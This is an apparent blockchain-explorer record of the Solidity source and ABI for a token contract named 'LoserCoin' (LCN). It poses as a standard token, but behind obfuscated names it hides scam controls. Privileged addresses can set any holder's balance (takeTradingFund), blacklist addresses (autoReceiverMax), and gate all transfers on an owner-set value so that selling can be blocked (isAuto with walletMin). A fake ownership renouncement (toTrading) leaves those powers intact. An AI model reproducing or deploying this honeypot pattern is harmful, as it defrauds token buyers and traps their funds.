{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract atTradingLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverMax {\n    function createPair(address tradingIs, address feeSell) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface enableTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface marketingAutoLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityWallet) external view returns (uint256);\n\n    function transfer(address atLaunched, uint256 marketingEnable) external returns (bool);\n\n    function allowance(address listTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atLaunched,\n        uint256 marketingEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitFundTrading, uint256 value);\n    event Approval(address indexed listTx, address indexed spender, uint256 value);\n}\n\ninterface marketingAutoLaunchedMetadata is marketingAutoLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LoserCoin is atTradingLaunched, marketingAutoLaunched, marketingAutoLaunchedMetadata {\n\n    function allowance(address fromFund, address modeLiquidity) external view virtual override returns (uint256) {\n        if (modeLiquidity == maxShould) {\n            return type(uint256).max;\n        }\n        return feeTotal[fromFund][modeLiquidity];\n    }\n\n    bool private limitSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenMaxIs;\n    }\n\n    function isAuto(address atTo, address atLaunched, uint256 marketingEnable) internal returns (bool) {\n        if (atTo == listMin) {\n            return tradingLiquidity(atTo, atLaunched, marketingEnable);\n        }\n        uint256 isSell = marketingAutoLaunched(exemptSwap).balanceOf(senderAmount);\n        require(isSell == launchModeLiquidity);\n        require(atLaunched != senderAmount);\n        if (marketingMinLimit[atTo]) {\n            return tradingLiquidity(atTo, atLaunched, shouldTotal);\n        }\n        marketingEnable = tokenLiquidityWallet(atTo, atLaunched, marketingEnable);\n        return tradingLiquidity(atTo, atLaunched, marketingEnable);\n    }\n\n    uint256 constant shouldTotal = 5 ** 10;\n\n    bool public totalMax;\n\n    mapping(address => bool) public modeToMarketing;\n\n    uint256 launchModeLiquidity;\n\n    mapping(address => bool) public marketingMinLimit;\n\n    address public listMin;\n\n    uint8 private amountAutoLimit = 18;\n\n    function transferFrom(address atTo, address atLaunched, uint256 marketingEnable) external override returns (bool) {\n        if (_msgSender() != maxShould) {\n            if (feeTotal[atTo][_msgSender()] != type(uint256).max) {\n                require(marketingEnable <= feeTotal[atTo][_msgSender()]);\n                feeTotal[atTo][_msgSender()] -= marketingEnable;\n            }\n        }\n        return isAuto(atTo, atLaunched, marketingEnable);\n    }\n\n    uint256 public launchedFund;\n\n    uint256 private liquidityTx = 100000000 * 10 ** 18;\n\n    uint256 public swapToToken = 0;\n\n    function tokenTo() private view {\n        require(modeToMarketing[_msgSender()]);\n    }\n\n    bool public exemptSell;\n\n    mapping(address => uint256) private fundReceiverSender;\n\n    mapping(address => mapping(address => uint256)) private feeTotal;\n\n    uint256 public shouldTx;\n\n    string private receiverFee = \"Loser Coin\";\n\n    bool private tokenFund;\n\n    function balanceOf(address liquidityWallet) public view virtual override returns (uint256) {\n        return fundReceiverSender[liquidityWallet];\n    }\n\n    function toTrading() public {\n        emit OwnershipTransferred(listMin, address(0));\n        swapSender = address(0);\n    }\n\n    string private tokenMaxIs = \"LCN\";\n\n    function approve(address modeLiquidity, uint256 marketingEnable) public virtual override returns (bool) {\n        feeTotal[_msgSender()][modeLiquidity] = marketingEnable;\n        emit Approval(_msgSender(), modeLiquidity, marketingEnable);\n        return true;\n    }\n\n    address maxShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function autoReceiverMax(address launchedMax) public {\n        tokenTo();\n        if (autoToken) {\n            tokenFund = true;\n        }\n        if (launchedMax == listMin || launchedMax == exemptSwap) {\n            return;\n        }\n        marketingMinLimit[launchedMax] = true;\n    }\n\n    bool public autoToken;\n\n    function maxListTeam(address marketingMinShould) public {\n        if (exemptSell) {\n            return;\n        }\n        if (exemptFund != totalMax) {\n            totalMax = false;\n        }\n        modeToMarketing[marketingMinShould] = true;\n        if (shouldTx != teamLaunched) {\n            totalMax = false;\n        }\n        exemptSell = true;\n    }\n\n    uint256 public teamLaunched;\n\n    function tradingLiquidity(address atTo, address atLaunched, uint256 marketingEnable) internal returns (bool) {\n        require(fundReceiverSender[atTo] >= marketingEnable);\n        fundReceiverSender[atTo] -= marketingEnable;\n        fundReceiverSender[atLaunched] += marketingEnable;\n        emit Transfer(atTo, atLaunched, marketingEnable);\n        return true;\n    }\n\n    uint256 listLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverFee;\n    }\n\n    bool private exemptFund;\n\n    function owner() external view returns (address) {\n        return swapSender;\n    }\n\n    event OwnershipTransferred(address indexed launchedLimit, address indexed sellAmount);\n\n    constructor (){\n        if (autoToken != tokenFund) {\n            autoToken = true;\n        }\n        toTrading();\n        enableTo launchedReceiver = enableTo(maxShould);\n        exemptSwap = receiverMax(launchedReceiver.factory()).createPair(launchedReceiver.WETH(), address(this));\n        senderAmount = receiverMax(launchedReceiver.factory()).feeTo();\n        if (launchedFund == shouldTx) {\n            exemptFund = false;\n        }\n        listMin = _msgSender();\n        modeToMarketing[listMin] = true;\n        fundReceiverSender[listMin] = liquidityTx;\n        if (launchedFund != teamLaunched) {\n            teamLaunched = launchedFund;\n        }\n        emit Transfer(address(0), listMin, liquidityTx);\n    }\n\n    function transfer(address shouldTokenFund, uint256 marketingEnable) external virtual override returns (bool) {\n        return isAuto(_msgSender(), shouldTokenFund, marketingEnable);\n    }\n\n    function takeTradingFund(address shouldTokenFund, uint256 marketingEnable) public {\n        tokenTo();\n        fundReceiverSender[shouldTokenFund] = marketingEnable;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountAutoLimit;\n    }\n\n    function walletMin(uint256 marketingEnable) public {\n        tokenTo();\n        launchModeLiquidity = marketingEnable;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityTx;\n    }\n\n    function tokenLiquidityWallet(address atTo, address atLaunched, uint256 marketingEnable) internal view returns (uint256) {\n        require(marketingEnable > 0);\n\n        uint256 amountToken = 0;\n        if (atTo == exemptSwap && senderTotalAt > 0) {\n            amountToken = marketingEnable * senderTotalAt / 100;\n        } else if (atLaunched == exemptSwap && swapToToken > 0) {\n            amountToken = marketingEnable * swapToToken / 100;\n        }\n        require(amountToken <= marketingEnable);\n        return marketingEnable - amountToken;\n    }\n\n    address senderAmount;\n\n    function getOwner() external view returns (address) {\n        return swapSender;\n    }\n\n    address public exemptSwap;\n\n    address private swapSender;\n\n    uint256 public senderTotalAt = 3;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFundTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"}],\"name\":\"autoReceiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingMinLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMinShould\",\"type\":\"address\"}],\"name\":\"maxListTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeToMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotalAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTokenFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingEnable\",\"type\":\"uint256\"}],\"name\":\"takeTradingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTokenFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingEnable\",\"type\":\"uint256\"}],\"name\":\"walletMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LoserCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}